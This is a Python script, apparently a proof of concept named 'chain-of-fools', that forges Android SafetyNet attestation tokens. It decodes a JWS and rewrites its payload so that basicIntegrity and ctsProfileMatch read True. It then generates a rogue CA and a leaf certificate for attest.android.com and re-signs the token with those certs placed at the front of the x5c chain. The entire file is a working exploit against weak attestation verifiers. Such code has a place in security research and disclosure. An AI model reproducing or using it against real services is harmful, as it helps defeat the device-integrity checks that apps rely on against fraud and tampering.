import base64
import json
import os

from typing import Dict, TypeVar

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import Encoding

import const
import rogue_ca


T = TypeVar('T')
C = TypeVar('C')


def modify_jws_and_forge_signature(raw_jws: bytes, payload_modify_function=None) -> bytes:
    """Take in a JWS in raw form (concatenated URL-safe base64), modify its payload
    using payload_modify_function, and then forge a signature with a new CA that will be attached
    to the cert chain.

    Arguments:
      raw_jws: string -- the raw JWS value (from SafetyNet or similar)
      payload_modify_function (optional): function -- will be applied to the payload
        before forging signature
    """

    # Step 1: parse out the header, payload, signature
    header, payload, signature = decode_jws_parts(raw_jws)
    _header_parsed = parse_jws_header(header)

    # Step 2a: create a new rogue CA and add it to the x5c chain
    _rogue_ca_pub, rogue_ca_priv, rogue_ca_cert = rogue_ca.generate_ca('chain-of-fools rogue CA')

    # Step 2b: create a leaf cert issued by the CA
    leaf_cert, leaf_cert_priv = rogue_ca.generate_leaf_cert('attest.android.com', rogue_ca_cert, rogue_ca_priv)

    # Step 3: transform the payload
    if payload_modify_function:
        payload = payload_modify_function(payload)

    # Step 4: package it back up
    b64_header, b64_payload, b64_signature = rogue_sign_jws(
        leaf_cert_priv, rogue_ca_cert, leaf_cert, header, payload, signature)

    return b'.'.join([b64_header, b64_payload, b64_signature])


def _fix_base64_padding(data: bytes) -> bytes:
    """Extend the base64 padding until it's correct. This is needed for some
    forms of URL-safe base64 which do not include padding.
    """
    missing_padding = len(data) % 4
    if missing_padding:
        data += b'=' * (4 - missing_padding)
    return data


def _urlsafe_b64encode_without_padding(data: bytes) -> bytes:
    """urlsafe_b64encode but remove the padding.
    """
    return base64.urlsafe_b64encode(data).rstrip(b'=')


def decode_jws_parts(raw_jws: bytes) -> (bytes, bytes, bytes):
    """Take a raw JWS string and base64 decode it, returning the header, payload, and signature.
    """
    jws_parts = raw_jws.split(b".")
    if len(jws_parts) != 3:
        raise Exception("JWS input does not appear to be valid JWS")

    header_b64, payload_b64, signature_b64 = map(_fix_base64_padding, jws_parts)
    header, payload, signature = map(base64.urlsafe_b64decode, (header_b64, payload_b64, signature_b64))
    return header, payload, signature

def parse_jws_header(header: bytes) -> Dict[str, T]:
    return json.loads(header)

# ================

def set_safetynet_passing(payload: bytes) -> bytes:
    """Modify the SafetyNet JSON payload to set integrity / profile match to True.
    """
    decoded_payload = json.loads(payload)
    decoded_payload['basicIntegrity'] = True
    decoded_payload['ctsProfileMatch'] = True
    return json.dumps(decoded_payload).encode()
    
def rogue_sign_jws(leaf_cert_priv: T, rogue_ca_cert: C, leaf_cert: C, header: bytes, payload: bytes, signature: bytes) -> bytes:
    '''param rogue_ca: A (non URL-safe) base64 encoded DER certificate.
    '''
    encoded_rogue_ca_cert = base64.b64encode(rogue_ca_cert.public_bytes(Encoding.DER)).decode('utf-8')
    encoded_leaf_cert = base64.b64encode(leaf_cert.public_bytes(Encoding.DER)).decode('utf-8')
    h = json.loads(header)
    h['x5c'] = [encoded_leaf_cert, encoded_rogue_ca_cert] + h['x5c']
    header = bytes(json.dumps(h), 'utf-8')
    b64_header = _urlsafe_b64encode_without_padding(header)
    b64_payload = _urlsafe_b64encode_without_padding(payload)
    signature = leaf_cert_priv.sign(
        b64_header + b'.' + b64_payload,
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    return b64_header, b64_payload, _urlsafe_b64encode_without_padding(signature)


if __name__ == '__main__':
    ret = modify_jws_and_forge_signature(const.RAW_JWS, set_safetynet_passing)
    print('# Encoded Modified JWS')
    print(ret.decode('utf-8'))
